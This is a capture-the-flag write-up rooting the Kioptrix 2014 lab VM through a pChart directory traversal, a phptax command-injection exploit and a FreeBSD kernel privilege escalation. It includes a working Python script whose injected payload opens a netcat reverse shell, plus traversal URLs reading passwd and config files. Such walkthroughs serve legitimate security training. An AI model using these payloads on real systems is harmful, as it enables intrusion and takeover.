I"{B<p>This is a linux machine that involves exploiting a Directory Traversal in pChart 2.1.3 running on port 80, in order to locally enumerate the system and be able to access to the web service running on port 8080 and exploit a Remote Code Execution on phptax to get our shell with limited permissions, and then using a kernel exploit  it was possible to get root.</p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The machine was discovered on the local network with arp scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.0/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.168 00:0c:29:5f:78:95       VMware, Inc.
192.168.179.254 00:50:56:ee:a4:9d       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan found two available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">--open</span> 192.168.179.168 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 00:0C:29:5F:78:95 <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning was performed against open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span>,8080 192.168.179.168 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.2.21 <span class="o">((</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: Apache/2.2.21 <span class="o">(</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
8080/tcp open  http    Apache httpd 2.2.21 <span class="o">((</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<span class="o">)</span>
|_http-title: 403 Forbidden
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Nothing was found on the web page, so I decided to enumerate the source page and found a link to another page.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.168/ | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'pC[^"]*'</span>  
pChart2.1.3/index.php
</code></pre></div></div>

<p>There’s a Directory Traversal exploit for this version of pechart, so we proceed download the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>wget https://www.exploit-db.com/download/31173
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="directory-traversal">Directory Traversal</h3>

<p>PHP library pChart 2.1.3 (and possibly previous versions) by default contains an examples folder, where the application is vulnerable to Directory Traversal and Cross-Site Scripting (XSS).</p>

<p>We check the proof of concept, as we can see the content of the passwd file is displayed on the screen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.168/pChart2.1.3/examples/index.php?Action<span class="o">=</span>View&amp;Script<span class="o">=</span>%2f..%2f..%2fetc/passwd
</code></pre></div></div>

<p><img src="/assets/images/kioptrix2014/screenshot-2.png" alt="" /></p>

<p>Listing the default apache configuration file, we can see the document root of the service running on port 8080, and the user agent allowed to access it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.168/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf"</span> | html2text | <span class="nb">tail</span> <span class="nt">-19</span>

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

&lt;VirtualHost <span class="k">*</span>:8080&gt;
    DocumentRoot /usr/local/www/apache22/data2

&lt;Directory <span class="s2">"/usr/local/www/apache22/data2"</span><span class="o">&gt;</span>
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env<span class="o">=</span>Mozilla4_browser
&lt;/Directory&gt;



&lt;/VirtualHost&gt;


Include etc/apache22/Includes/<span class="k">*</span>.conf
</code></pre></div></div>

<p>We check with the curl utility when requesting the web service with the user agent Mozilla/4.0.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-A</span> <span class="s1">'Mozilla/4.0'</span> http://192.168.179.168:8080/
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
&lt;html&gt;
 &lt;<span class="nb">head</span><span class="o">&gt;</span>
  &lt;title&gt;Index of /&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"phptax/"</span><span class="o">&gt;</span> phptax/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<p>The normal access with the browser is forbidden.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-3.png" alt="" /></p>

<p>So we need to set up burp to access the web page, follow the corresponding instructions:</p>

<p>Open BurpSuite, click on Proxy -&gt; Options -&gt; Match and Replace, and we define the custom user-agent.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-4.png" alt="" /></p>

<p>Now we can access to the page, click on the link.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/kioptrix2014/screenshot-6.png" alt="" /></p>

<h3 id="remote-code-execution">Remote Code Execution</h3>

<p>Googling I found that phptax is vulnerable to remote code execution, we downloaded the exploit to analyze the proof of concept.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>wget https://www.exploit-db.com/download/21665
</code></pre></div></div>

<p>To exploit it, I developed a python script that replicates the exploitation process and gets a shell automatically.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: {} [RHOST] [LHOST] [LPORT]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">rhost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">lhost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">lport</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc {} {} &gt; /tmp/f"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">"http://{}:8080/phptax/drawimage.php?pfilez=xxx;{};&amp;pdf=make"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="p">.</span><span class="n">PoolManager</span><span class="p">()</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">'GET'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'User-Agent'</span><span class="p">:</span><span class="s">'Mozilla/4.0'</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">listener</span><span class="p">():</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"nc -vlnp {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">lport</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span> 
    <span class="n">l</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">listener</span><span class="p">)</span>
    <span class="n">e</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">exploit</span><span class="p">)</span>

    <span class="n">l</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">e</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>We run the exploit and we get a shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>python3 pwn.py 192.168.179.168 192.168.179.1 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.168] 56350
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
/bin/csh <span class="nt">-i</span>
Warning: no access to <span class="nb">tty</span> <span class="o">(</span>Bad file descriptor<span class="o">)</span><span class="nb">.</span>
Thus no job control <span class="k">in </span>this shell.
kioptrix2014#
</code></pre></div></div>

<p>By listing the kernel version, it appears to be vulnerable to kernel exploitation.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kioptrix2014# <span class="nb">uname</span> <span class="nt">-a</span>
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE <span class="c">#0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="linux-kernel">Linux Kernel</h3>

<p>The vm_map_lookup function in sys/vm/vm_map.c in the mmap implementation in the kernel in FreeBSD 9.0 through 9.1-RELEASE-p4 does not properly determine whether a task should have write access to a memory location, which allows local users to bypass filesystem write permissions and consequently gain privileges via a crafted application that leverages read permissions, and makes mmap and ptrace system calls.</p>

<p>We download the exploit and start a web server with python.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/kioptrix2014<span class="nv">$ </span>wget https://www.exploit-db.com/download/26368

root@kali:~/kioptrix2014<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
</code></pre></div></div>

<p>On the attacking machine, we download the exploit, compile it and execute it, as we can see we gain root privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kioptrix2014# <span class="nb">cd</span> /tmp
kioptrix2014# fetch <span class="nt">-o</span> 26368.c http://192.168.179.1:8000/26368
kioptrix2014# gcc 26368.c <span class="nt">-o</span> 26368
kioptrix2014# ./26368
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/csh <span class="nt">-i</span>
Warning: no access to <span class="nb">tty</span> <span class="o">(</span>Bad file descriptor<span class="o">)</span><span class="nb">.</span>
Thus no job control <span class="k">in </span>this shell.
kioptrix2014# <span class="nb">cd</span> /root
kioptrix2014# <span class="nb">head </span>congrats.txt
If you are reading this, it means you got root <span class="o">(</span>or cheated<span class="o">)</span><span class="nb">.</span>
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made <span class="k">for </span>the beginner <span class="k">in 
</span>mind, and not meant <span class="k">for </span>the seasoned pentester. However this does not mean one 
can<span class="s1">'t enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering &amp; research. Anyone can throw massive amounts of exploits
</span></code></pre></div></div>
:ET